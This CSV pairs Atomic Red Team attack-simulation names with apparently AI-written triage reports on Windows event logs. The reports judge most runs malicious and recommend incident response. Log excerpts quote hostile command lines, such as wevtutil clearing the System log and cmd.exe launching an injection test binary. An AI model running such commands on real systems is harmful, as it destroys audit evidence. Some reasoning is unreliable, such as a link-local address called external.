Directory Name,AI Response
LockBit Black - Modify Group policy settings -Powershell,"Upon analysis of the provided Windows event logs, several key observations raise concerns indicating potential malicious activity:

1. **Log Clearing Activities**:
   - The logs reveal multiple instances of log clearing, performed by the user `admin_test`, who appears to have administrative privileges. Notably, Sysmon event logs and PowerShell logs were cleared, which is often an attempt by malicious actors to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The execution of PowerShell commands that modify registry keys, particularly within `HKLM:\SOFTWARE\Policies\Microsoft\Windows\System`, indicates potential malicious behavior. The command-line arguments to change Group Policy refresh times and SmartScreen settings could be indicative of tampering with security settings.

3. **Use of Windows System Utilities**:
   - The `wevtutil.exe` was used to clear event logs. It’s a known technique used by adversaries to erase evidence of their activities. Furthermore, the chain of `conhost.exe` processes following `wevtutil.exe` could suggest an attempt to obfuscate actions.

4. **High-Integrity Level Execution**:
   - Multiple processes executed under a high integrity level, which typically indicates privileged execution capabilities, further suggests the misuse of administrative credentials.

5. **Temporal and Correlation Analysis**:
   - The timing of events (log clearing) and PowerShell execution closely align, reinforcing the hypothesis that a deliberate attempt was made to disrupt normal security monitoring and harden post-compromise operations.

Given the combination of these events, especially the registry changes via PowerShell, the clearing of logs (Sysmon, Security, Windows PowerShell), and the presence of suspicious process execution vectors, it is clear that these logs exhibit patterns associated with an intrusion or compromise.

**Assessment and Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Initiate an immediate incident response protocol to contain and assess the scope of the breach.
- Conduct memory captures and forensic analysis of Server002 to detect any further malicious artifacts.
- Verify the integrity of critical system configurations and Group Policy objects.
- Implement enhanced monitoring, particularly around PowerShell activity and log clearance activities.
- Reset credentials for `admin_test` and review the account’s recent activities. Consider auditing administrative access policies.
- Review and strengthen logging retention policies to avoid unauthorized access and clearance in future scenarios.

This analysis identifies a likely significant security incident that merits urgent attention and remediation actions."
Azure AD Application Hijacking - App Registration,"Upon analyzing the provided Windows event logs, I've identified several indicators and activities that raise concerns about potential malicious activity:

1. **Security Events (EventID 1102) - Log Clearing**: 
   - There is a security event indicating that logs for the System and Security channels were cleared by the user ""SERVER002\admin_test"". This is suspicious behavior when not part of routine maintenance, as attackers often clear logs to erase traces of their activity.

2. **Sysmon Events - PowerShell Activity**:
   - Multiple Sysmon logs indicate execution of PowerShell processes with potentially suspicious command lines (e.g., PowerShell script importing AzureAD module and setting up credentials, creating certificates).
   - PowerShell is a powerful tool often used by administrators but is also frequently abused by attackers for post-compromise actions. The nature of the commands being executed in the provided logs, especially involving AzureAD and certificate handling, can signal attack tactics related to credential theft, application hijacking, or backdoor setup.

3. **PowerShell Logs**:
   - The PowerShell logs reflect the execution of scripts that manage AzureAD applications, certificates, and credential objects, which could indicate unauthorized access attempts or the setting of a potentially malicious persistence mechanism.

4. **Event Correlation**:
   - There are several PowerShell events and processes stemming from the user ""SERVER002\admin_test"" that demonstrate potential lateral movement or privilege escalation attempts.

5. **Security Privileges (EventID 4672)**:
   - Privileged rights were assigned to the SYSTEM account, including high-impact privileges like `SeDebugPrivilege`, often sought by attackers to bypass security mechanisms.

Given the combination of these factors, the activities recorded in these logs stand out as potentially malicious. The clearing of event logs and the execution of PowerShell scripts involving AzureAD raise red flags that warrant a deeper investigation.

**Final Assessment**: MALICIOUS

**Guidance for Proceeding**:
- **Immediate Actions**: Isolate the affected system to prevent further potential compromise within the network.
- **Thorough Investigation**: Conduct a detailed forensic analysis to trace the origins and full scope of the PowerShell activity, examining potentially affected credentials and AzureAD setups.
- **Review and Harden**: Implement additional monitoring and hardening of PowerShell usage, including script block logging and constrained language mode.
- **Security Awareness**: Alert the IT and security teams to the observed behaviors and promote vigilance against similar tactics in the network.
"
Add Federation to Azure AD,"### Analysis of Logs

The provided event logs show a series of activities across various system components. Here's a breakdown of the logs and the analysis of any potential malicious activity:

---

### Sysmon Log

1. **Console Window Host (`conhost.exe`) Spawned by Eventing Command Line Utility (`wevtutil.exe`)**:
   - Multiple entries show `conhost.exe` being spawned by `wevtutil.exe`. This behavior is normal as `conhost.exe` is used to host console windows and often accompanies command-line utilities like `wevtutil.exe`.

2. **`wevtutil.exe` Command Execution**: 
   - The repeated use of the command `wevtutil.exe cl <channel>` indicates that various event logs (System, Application, Security, and Windows PowerShell) are being cleared.
   - This action is noteworthy because log clearing can indicate an attempt to cover tracks after malicious activity.

3. **Windows PowerShell Activity**:
   - Execution of a PowerShell script with modules `AzureAD` and `AADInternals`, and use of commands like `Connect-AzureAD` and `ConvertTo-AADIntBackdoor`. The script attempts to manage Azure AD domains, create tokens, and backdoors.
   - This type of PowerShell activity is highly suspicious and indicative of malicious intent, specifically if the script successfully creates a backdoor for persistent access.

4. **Instances of Windows Management Host (`wsmprovhost.exe`)**:
   - Multiple instances appearing as the parent process of several commands, which is typical for command execution via a remote management session.

---

### System Log

1. **Event Log Clearing (`EventID 104`)**:
   - There are entries showing the clearing of the System and Windows PowerShell logs by a user `admin_test`. Log clearing is a strong indicator of malicious activity aiming to remove traces of other activities.

---

### Windows PowerShell Log

1. **Execution of Suspicious PowerShell Scripts**:
   - Detailed PowerShell activity logs corresponding with the Sysmon logs. The use of the `AADInternals` module and scripts designed to manage Azure AD configurations in a suspicious manner reaffirms potential malicious actions.

---

### Security Log

1. **Audit Log Clearing (`EventID 1102`)**:
   - The Security log records were cleared by `admin_test`. This further corroborates suspicious activity, as attackers often clear logs to hide malicious actions.

---

### Application Log

- The Application log appears incomplete or devoid of significant entries, which aligns with logs being cleared.

---

### Conclusion and Recommendations

The analysis indicates:

- **Indicators of Malicious Activity**: The use of `wevtutil.exe` to clear logs (`cl`) and the execution of a PowerShell script involving AzureAD manipulation and backdoor actions suggest malicious intent.
- **Attempted Cover-up**: The clearing of event logs (System, Security, PowerShell) by the same user further suggests actions attempting to remove traces.

**Resolution: MALICIOUS**

### Guidance

- **Immediate Actions**:
  1. **Isolate the Host**: Disconnect `Server002` from the network to prevent further compromise.
  2. **Investigate Credentials**: Assess whether `admin_test` credentials have been leaked or misused.
  3. **Review Azure AD Changes**: Examine recent Azure AD domain modifications for signs of unauthorized changes or backdoors.
  4. **Detailed Forensic Analysis**: Conduct a thorough forensic investigation to determine full scope and prevent future occurrences.
  5. **Notify Stakeholders**: Inform IT security teams and management of the findings for further actions.

- **Preventive Measures**:
  1. **Enhance Logging**: Ensure logs are protected against unauthorized clearing and are regularly backed up.
  2. **Audit PowerShell Use**: Implement strict controls and monitoring over PowerShell script execution.
  3. **Credential Monitoring**: Use tools to monitor for suspicious logins and changes to administrative accounts."
Shellcode execution via VBA,"### Detailed Analysis

Upon reviewing the provided logs, the following observations can be made:

1. **Process Execution Chain**:
   - Multiple instances of `wevtutil.exe` are observed, which is a legitimate utility used for exporting, archiving, and clearing event logs. However, its frequent usage, especially for clearing logs, can be indicative of malicious activity trying to erase tracks.
   - `PowerShell.exe` is also observed executing commands from unauthorized sources. The executed script is downloaded from a URL under control of an entity (`raw.githubusercontent.com/redcanaryco/atomic-red-team`), suggesting a possible execution of a suspicious or potentially harmful script.

2. **PowerShell Activity**:
   - The `PowerShell` logs indicate execution of a script from an external URL, a common tactic used by attackers to download and execute malicious code. The specific command referenced in the `PowerShell` logs (**`Invoke-Maldoc`**) can denote a simulated attack from the Atomic Red Team framework, often used for testing security defenses by simulating attacks.
   - The command-line arguments and the use of `IEX` (Invoke-Expression) to execute the downloaded script increases the risk factor, as it might allow for the execution of unauthorized scripts.

3. **Log Clearing Events**:
   - Several logs in different channels (System, Security, and Windows PowerShell) have been cleared by `admin_test`, as indicated by event ID `1102` in the Security log and event ID `104` in System and Application logs. Clearing logs deliberately can be indicative of an attempt to hide malicious activities.

### Assessment

The observed activities align with tactics typically associated with malicious intent, particularly:

- **Log Manipulation**: Clearing logs in the System, Security, and PowerShell channels.
- **Execution of Suspicious Scripts**: Usage of PowerShell to download and execute a script from an external location.
  
Both are strong indicators that suggest the system might have been compromised or is currently under attack.

### Recommendations

1. **Immediate Response**:
   - If not already isolated, isolate the host from the network to prevent potential spread or data exfiltration.
   - Perform a forensic analysis to verify the integrity of the system and ensure it is securely cleaned.

2. **Further Investigation**:
   - Investigate the `admin_test` account activities and verify if it is compromised, especially focusing on any privilege escalation or lateral movement.
   - Determine the intent and effect of the executed scripts from the PowerShell log by referencing the scripts indicated.

3. **Enhancements**:
   - Implement strict group policy settings to limit execution policies for PowerShell and logging to detect unusual PowerShell activities.
   - Enhance monitoring and alerting capabilities to detect and respond to script execution and log manipulation activities.

### Resolution: **MALICIOUS**

The logs provide clear evidence of activities (log clearing and script execution from external sources) that align with typical malicious behavior, indicating a potential compromise. Immediate action and a thorough investigation are required to address and remediate the apparent potential threat."
Process Injection via C#,"**Detailed Analysis:**

Upon reviewing the provided logs, a sequence of events indicates potential malicious activity:

1. **Utilization of Wevtutil for Log Clearing:**
   - The `wevtutil.exe` command line utility was used multiple times with the `cl` (clear log) argument on critical logs like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This action is often taken by adversaries to cover their tracks after malicious activity.
   - Example log entry:
     ```json
     {
       ""ProcessId"": ""6132"",
       ""Image"": ""C:\\Windows\\System32\\wevtutil.exe"",
       ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System"",
       ""User"": ""SERVER002\\admin_test""
     }
     ```

2. **Execution of Suspicious Commands:**
   - There is a suspicious execution of `cmd.exe` with a command line argument invoking a binary from the `AtomicRedTeam` directory (`T1055.exe`). This indicates a likely simulation or testing of known attack techniques.
   - The process lineage shows `cmd.exe` was executed from a high-integrity level, further compounding the risk.
   - Example log entry:
     ```json
     {
       ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
       ""CommandLine"": ""\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.004\\bin\\T1055.exe\"""",
       ""User"": ""SERVER002\\admin_test""
     }
     ```

3. **Time Tampering:**
   - The system time was altered multiple times, which is another tactic used to evade detection by manipulating the timestamps of incident activities.
   - Example log entry:
     ```json
     {
       ""PreviousTime"": ""2024-10-22 18:16:12.1088799"",
       ""NewTime"": ""2024-10-22 18:15:43.4382865""
     }
     ```

4. **Execution of Common Reconnaissance Commands:**
   - Utilities like `whoami.exe` and `hostname.exe` were executed, which are commonly used to gather information about the system and user context during the initial stages of an attack.

**Assessment:**
- The coordinated clearing of system logs, along with the execution of a potentially harmful script from the `AtomicRedTeam` folder, and the alteration of system time are indicative of malicious behavior.
- These actions suggest an attempt to simulate an attack and cover tracks, possibly as part of red team activities or an actual compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Response:**
   - Isolate the system to prevent any further potential spread or damage.
   - Gather physical memory dumps and additional artifacts for deeper forensic analysis.

2. **Investigation and Remediation:**
   - Review user access and permissions, especially for `SERVER002\admin_test`.
   - Perform a thorough investigation of any external connections or data exfiltration that might have occurred.
   - Validate and update security policies to detect and alert on similar activities in the future.

3. **Enhancement of Security Measures:**
   - Improve monitoring solutions to detect unusual command execution and log-clearing operations.
   - Educate staff on the importance of operational security and the indicators of a compromised system.
   
Taking these steps will help minimize the impact of the detected malicious activity and strengthen the organization's defenses against future incidents."
Azure AD - adding permission to application,"Upon analyzing the provided event logs, several activities raise concerns and suggest potential malicious behavior. Below is a detailed analysis of suspicious activities:

1. **PowerShell Activity with AzureAD Module**:
   - There is a significant PowerShell activity involving the AzureAD module, opening the possibility of malicious intent. The command imports the AzureAD module and proceeds with actions like creating an application, service principal, and configuring access permissions.
   - The credentials used in the script are built using plaintext, which is not a security best practice. This could indicate an attempted unauthorized access to Azure resources.

2. **Clearing Event Logs**:
   - The Security and System event logs show evidence of being cleared shortly after the high-level PowerShell activity.
   - The event logs were cleared by the ""admin_test"" user. Clearing logs is often done to cover tracks after malicious activity, indicating a potential compromise.

3. **Suspicious Commands Involving wevtutil.exe**:
   - Multiple instances of ""wevtutil.exe"" command were executed to clear logs, as detailed in the Security log (EventID 1102) and matching entries in the System log (EventID 104).
   - ""wevtutil"" is a legitimate Windows utility, but consecutive usage, especially for clearing event logs, is unusual and suspicious.

4. **High Integrity Level Processes**:
   - The PowerShell process launches with a high integrity level, implying it ran with elevated privileges. 
   - Coupled with the creation of Azure resources and clearing logs, this elevation is suspect.

5. **Windows PowerShell Provider Logs**:
   - The Windows PowerShell logs corroborate the execution of the PowerShell script, further raising concerns since the activity is linked to potential configuration and access of Azure resources.

**Assessment**:
The combination of detailed PowerShell activity involving AzureAD manipulation, clearing critical logs, running high integrity processes, and instances of ""wevtutil.exe"" to clear logs are strong indicators of possible malicious behavior or compromise.

**Resolution**: MALICIOUS

**Recommendations**:
1. **Incident Response**: Immediately initiate an incident response procedure to contain and examine the compromised system.
2. **Credential Audits**: Reset credentials that may have been exposed, especially for sensitive Azure accounts.
3. **Log Monitoring**: Enhance monitoring to detect unauthorized log clearance and excessive privilege commands.
4. **Audit Azure Configurations**: Review Azure configurations for unauthorized changes and activity.
5. **Security Awareness**: Educate employees on the risks of using plaintext passwords in scripts and other security best practices."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"### Detailed Analysis:

Upon review of the provided Windows event logs, several activities stand out as indicators of potentially malicious behavior:

1. **Event Log Clearance:**
   - Multiple instances of the event log being cleared are present, as shown by System Event ID 104 entries indicating logs being cleared by the user ""admin_test"" on the ""System"" and ""Windows PowerShell"" channels.
   - In the Security log, Event ID 1102 is another instance indicating the security log was cleared.

2. **Execution of Suspicious Processes:**
   - The PowerShell logs show evidence of suspicious command execution involving `AtomicRedTeam` artifacts (`T1055`) and suspicious executables like `EtwpCreateEtwThread.exe`. Atomic Red Team is a known framework for testing security operations which might suggest testing or an actual adversary using it for malicious activity.

3. **Use of WEvtUtil:**
   - The Sysmon logs describe processes such as ""wevtutil.exe"" being used with the command line to clear logs (e.g., ""cl System"", ""cl Application""). The WEvtUtil utility is being executed multiple times, potentially for log manipulation or clearance by ""admin_test"".

4. **Privilege Escalation Indicators:**
   - Security log Event ID 4672 indicates ""admin_test"" being assigned numerous high-level privileges including SeDebugPrivilege and others which could be abused for privilege escalation or further malicious activity.

5. **Network-Related Suspicious Logon:**
   - Logon events (Security log, Event ID 4624) using NTLM, originating from a non-standard workstation (`DESKTOP-3HL5B2P`) and indicating admin access from an external address using IPv6 (fe80::866a:d1f8:8d06:7bc), which is unusual for internal systems.

### Assessment Summary:

- The presence of cleared event logs is a significant red flag as it might indicate attempts to cover tracks after malicious activity.
- The use of legitimate tools like PowerShell and Wevtutil in potentially malicious ways adds to the suspicion.
- The activity linked to ""admin_test"" showing log clearances, suspicious privilege usage, and network logins aligns with behaviors associated with lateral movement or initial stages of intrusion.

### Resolution:

**MALICIOUS** - The combination of event log clearing, execution of suspicious executables from known attacking frameworks, multiple instances of elevated privileges, and network activity suggest confidence in a compromise or significant unauthorized action by potentially malicious actors.

### Guidance:

1. **Immediate Response:**
   - Isolate the affected system (""Server002"") from the network to prevent further potential propagation or data exfiltration.
   - Change all privileged account credentials immediately to mitigate further access.

2. **Further Investigation:**
   - Conduct a thorough forensic investigation of ""Server002"" including disk analysis and memory forensics to understand the full scope of the activities.
   - Review network logs and connections for anomalies, especially concerning the IPv6 address and system ""DESKTOP-3HL5B2P"".

3. **Post-Incident Actions:**
   - Strengthen monitoring on all systems for similar suspicious activities and privilege escalation attempts.
   - Implement strict access controls and improve logging practices to detect and prevent future incidents."
Domain Password Policy Check: No Uppercase Character in Password,"Upon analysis of the provided logs, several indicators of suspicious or potentially malicious activities stand out:

### Suspicious Findings:

1. **PowerShell Activity:**
   - Multiple PowerShell script executions involve checking and modifying password credential files, which is generally unusual and may indicate an attempt to capture or manipulate account credentials. The script checks for a password stored in a credential file and compares it with a new password for user accounts. This behavior is not common for legitimate administrative tasks unless specifically authorized and documented.

2. **Clearing of Event Logs:**
   - From the Sysmon log, we see the process `wevtutil.exe` being run multiple times to clear various event logs:
     - Security log cleared by process ID 4156: `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - The Application, System, and PowerShell logs are also being cleared. Clearing event logs can be an immediate attempt to cover tracks, which is a common tactic used after unauthorized or suspicious activities.

3. **Security Events:**
   - Log Event ID 1102 indicates that the security log was cleared by the `admin_test` user. Log clearing behavior is highly suspicious and usually indicative of malicious intent to hide the tracks of unauthorized activities.

4. **User Enumeration:**
   - The frequent occurrence of Event ID 4798 signifies attempts to query the Local Security Authority (LSA), which monitors known user accounts. This could suggest recon activities, potentially identifying accounts for exploitation.

5. **CompatTelRunner.exe Activity:**
   - The process `CompatTelRunner.exe`, a utility typically for telemetry, appears to be making frequent queries related to user accounts. While not generally suspicious on its own, its involvement in the user enumeration process needs scrutiny when combined with other findings.

6. **Execution of Privileged Operations:**
   - Event ID 4672 indicates special privileges were assigned to the `SYSTEM` account. While this event alone could be benign, contextually combined with log clearing and the nature of its execution, it adds to the suspicion.

### Assessment:
Considering the context and content of the log entries, the activities observed are certainly suspicious. The script behavior, combined with event log clearing, strongly indicates potential malicious activities, attempting to both manipulate credentials and cover tracks.

### Resolution:
**SUSPICIOUS**

The activities identified merit further investigation:
- Verify the legitimacy of the PowerShell scripts and validate if there is any authorized scheduled task or user action matching the Commands observed.
- Review user `admin_test`'s recent activities to verify whether they corroborate any legitimate use cases.
- Conduct a full incident response analysis by reviewing additional logs, especially correlating with network and endpoint data, to gain more evidence about unauthorized access or lateral movement across the network.
- Consider isolating the affected host (Server002) for deeper forensic analysis and consult with the IT team about potential recovery and remediation actions.

These steps should help determine whether the activities escalate to a verified malicious event or if they can be explained by benign patterns observed in further data."
secedit used to create a Run key in the HKLM Hive,"Upon reviewing the provided event logs, several entries suggest potentially suspicious activities, particularly:

1. **Log Clearance Activities:**
   - **System Log:** An entry indicates that the system logs were cleared by a user named `admin_test` (EventID 104). This can be a typical action if an administrator is conducting maintenance, but if it was unexpected, this could be an indicator of malicious behavior aimed at covering tracks.
   - **Security Log:** Additionally, the security logs were also cleared by the same user (EventID 1102). This could be seen as an attempt to hide illicit activities.

2. **Suspicious Use of `wevtutil.exe`:**
   - Entries across the Sysmon logs reveal multiple instances of `wevtutil.exe` being executed to clear logs (e.g., EventID 1 with command `wevtutil.exe cl <log>`). This is unusual behavior for automated systems and can be a strong indicator of someone trying to cover their tracks after performing activities on the system.

3. **Command Execution:**
   - There is a suspicious `cmd.exe` process execution (Sysmon EventID 1) with the command line involving `secedit` from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1547.001\\src\\regtemplate.ini`). This could suggest the use of a known attack simulation technique (e.g., Atomic Red Team Test) or possibly a genuine administrator task. However, due to its execution from a temporary directory, it warrants further scrutiny.

4. **Edge Update Observations:**
   - There are multiple EdgeUpdate activities (e.g., EventID 1) in the Sysmon logs run under SYSTEM authority. However, these do not appear overtly malicious since software updates are routine tasks from Microsoft Edge but should be noted if any unusual behavior coincided with these times.

### Assessment:

- **Likelihood of Malicious Activity:** The presence of log clearance commands, particularly using `wevtutil.exe` and the clearance of both the system and security logs by the same user, are highly suspicious. These actions often indicate an attempt to remove evidence and can be part of malicious post-exploitation behaviors.
- **Command Executions from Temporary Location:** This kind of activity, especially if not expected or known by the administrative team, contributes to the suspicion that malicious activities may have been performed.

### Resolution:

- **Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Investigation:** Conduct a thorough investigation into activities by the user `admin_test`, especially focusing on any administrative privileges and any changes made during the timestamps in question.
   
2. **Verify User Activities:** Confirm with administrators or staff if any legitimate maintenance was performed. If not, be prepared to take necessary incident response actions, including isolating the system and performing further forensic analysis.

3. **Audit Recent Changes:** Review and audit any recent changes made to systems that could correspond with privilege escalation or unusual system modifications.

4. **Enhanced Monitoring:** Implement more comprehensive monitoring and alerts for log clearance activities and any command line executions from temp directories to detect similar attempts in the future. 

Taking these steps will help ensure that any potential compromise is fully assessed and mitigated."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"### Detailed Analysis of Logs

#### Suspicious or Anomalous Behavior:

1. **Use of PowerShell to Modify Registry and Launch Executable:**
   - In the Sysmon and PowerShell logs, a PowerShell command was executed which modified a registry key (`HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}`) to set the `StubPath` pointing to `calc.exe`. It also invoked `runonce.exe` with the `/AlternateShellStartup` argument.
   - The PowerShell command was executed with high integrity level which indicates elevated privileges.
   - This activity is often associated with persistence mechanism by attackers to execute a payload every time a new user logs into the system.

2. **Event Log Clearance:**
   - The security log contains an event (ID 1102) indicating the security log was cleared by `admin_test`. Clearing logs is a tactic often used by attackers to cover their tracks.

3. **Abnormal Process Behavior:**
   - Multiple instances of `wevtutil.exe` were executed by `admin_test` to clear various logs (e.g., Sysmon, Application, Security). This is unusual for regular system operations and points towards malicious intent.

4. **Time Change Event:**
   - There are time change events (Event ID 4616 in Security Log) showing the system time being altered. While legitimate updates can occur, frequent or undocumented time changes can indicate malicious activity attempting to evade detection timelines.

5. **Execution of `whoami.exe` and `conhost.exe`:**
   - There are executions of system commands like `whoami.exe` and `conhost.exe` by `admin_test`, potentially part of discovering user details or establishing a session for further malicious exploitations.

6. **Multiple Executions of `MicrosoftEdgeUpdate.exe`:**
   - Several instances of `MicrosoftEdgeUpdate.exe` were executed, some from unexpected temporary directories. While updates are normal, unusual paths, and frequencies can be concerning, indicating possible use as a vector for payload delivery.

#### Assessment and Threats

- The use of PowerShell to modify registry keys and set the StubPath is especially suspicious, as it indicates a possible setup for persistence which is atypical for normal operations.
- Log clearing actions and attempts to manipulate logs using `wevtutil.exe`, coupled with the clearing of the Windows event logs, suggest potential log tampering by `admin_test` to disguise unauthorized activities.
- Time manipulation might be used to maintain synchrony between various logs after unauthorized access or actions.

#### Guidance on How to Proceed

- **Investigate the user `admin_test`:** Verify if there is any unauthorized access or impersonation involved.
- **Review PowerShell Execution Policies:** Ensure PowerShell is set to restrict scripts and logging is enabled for future inquiries.
- **Examine the Registry Key Modified:** Confirm the validity and necessity of these registry modifications.
- **Implement Audit Policies:** Strengthen security policies revolving around event log management and system time changes.
- **Conduct a Threat Hunt:** Investigate the system for any other indicators of compromise or persistence mechanisms.
- **Evaluate Installed Applications:** Ensure that executable files like those originating suspicious processes are legitimate and not tampered with.

### Finalized Resolution: **MALICIOUS**

- The identified activities strongly suggest malicious intent, primarily due to the manipulation of system settings and attempts to obscure actions through log and time modifications. Immediate containment and further incident response measures are advised."
Process Injection with Go using CreateThread WinAPI (Natively),"Based on a detailed analysis of the provided logs, several indicators suggest potentially suspicious activity, influencing the assessment towards malicious behavior. Below is the breakdown of each significant finding:

1. **Event Log Clearing (Security Event ID 1102 and System Event ID 104):** 
   - The logs indicate multiple occurrences of the `wevtutil.exe` utility being used to clear various event log channels (Security, System, Application, and Windows PowerShell). The clearing of event logs is often a malicious actor's attempt to cover their tracks.

2. **Time Manipulation (Security Event ID 4616 and System Event ID 1):**
   - The system time appears to have been deliberately altered (repeated Event ID 4616 entries showing time rollback). This is commonly associated with attempts to evade logging or to manipulate timestamps to hinder investigations.

3. **PowerShell Scripting and Usage of Atomic Red Team Artifacts:**
   - The PowerShell logs reveal execution of a file `CreateThreadNative.exe -debug` from a temporary directory associated with ""AtomicRedTeam,"" a known toolset used for simulating attack techniques. Execution of potentially harmful scripts or binaries in PowerShell might relate to reconnaissance or further exploitation.
   
4. **Frequent Execution of `conhost.exe`:**
   - The occurrence of multiple `conhost.exe` executions in sequence with `-ForceV1` parameters and association with suspicious processes is another point of concern. While `conhost.exe` is a legitimate Windows file, excessive spawning can denote attempts at process hollowing or evasion techniques.

5. **Integrity Level and User Context:**
   - Many of the activities are executed under a high integrity level by the `admin_test` account, which has cleared event logs and executed potential malware, suggesting compromised or malicious use of privileged accounts.

**Assessment:** Based on the examination, there is sufficient evidence in the logs indicating:
- Intentional obfuscation through log clearance.
- Possible use of attack simulation tools or actual malicious activity via PowerShell.
- Time distortion manipulation, a tactical move considered unusual for typical operational tasks.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the host `Server002` to prevent potential lateral movement within the network.
- Conduct thorough forensics beyond these logs on `Server002` to identify any further malicious binaries or compromised accounts.
- Revise access controls, especially for privileged accounts like `admin_test`. Consider enforced multi-factor authentication.
- Review and enhance logging and alerting mechanisms to prevent similar occurrences.
- Notify the incident response team to determine the full scope and remediate the threat."
Add Executable Shortcut Link to User Startup Folder,"Upon review of the provided logs, several points of interest indicating potential suspicious activities were observed:

### Security Log:
1. **EventID 1102** - The security log was cleared. This event is a clear indicator of potential malicious activity as it suggests someone is attempting to cover their tracks by deleting event logs. This was done by the user ""admin_test"" with the ClientProcessId of 6612.

### Application Log:
- No immediate suspicious activities were identified in the application log entries provided.

### Windows PowerShell Log:
1. **PowerShell Script Execution** - A PowerShell script was executed which creates a shortcut for ""calc.exe"" in the startup directory (""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup""). This behavior can indicate persistence mechanisms typical in malicious activities.

### Sysmon Log:
1. **Use of Wevtutil** - Multiple instances of ""wevtutil.exe"" were executed to clear event logs (Security, Application, and Sysmon channels). This further supports the suspicion of log tampering to erase traces of actions performed.
2. **PowerShell Execution** - As seen in the PowerShell logs, power shell was used to persistently launch 'calc.exe' by creating a shortcut in the startup folder.
3. **Frequent Execution of System Tools** - Multiple executions of ""whoami.exe"" and similar system tools may indicate reconnaissance or routine checks by a script or a malicious user attempting to gather operational details.

### System Log:
1. **EventID 104** - This event log also denotes clearing of the System and Windows PowerShell logs, which aligns with malicious intentions to erase tracks.

### Risk Assessment & Guidance:
- **Indicators of Malicious Activity**: The logs clearly show evidence of event log clearing combined with script execution intended for persistence (""calc.exe"" shortcut creation in startup). These are solid indicators of potentially malicious actions.
- **Immediate Actions**:
  - **Isolate the Host**: To prevent further potential spread or data exfiltration, isolate ""Server002"" from the network.
  - **Full Forensic Investigation**: Conduct a complete forensic examination of the host to identify any additional compromises and gather more comprehensive information about the attacker’s methodologies.
  - **Change Credentials**: Change passwords for all accounts that could have been accessed on this machine, especially those with administrative rights.
  - **Audit Other Systems**: Review other systems on the same network for similar behavior, ensuring this is not part of a broader attack.
  - **Enhance Monitoring**: Implement enhanced logging and alerting measures for any future event log clearing activities or suspicious PowerShell commands.

### Resolution:
The findings strongly suggest malicious activity due to consistent log deletion events, suspicious use of PowerShell for persistence, and other system details indicating tampering. Based on this analysis, the resolution is:
- **MALICIOUS**"
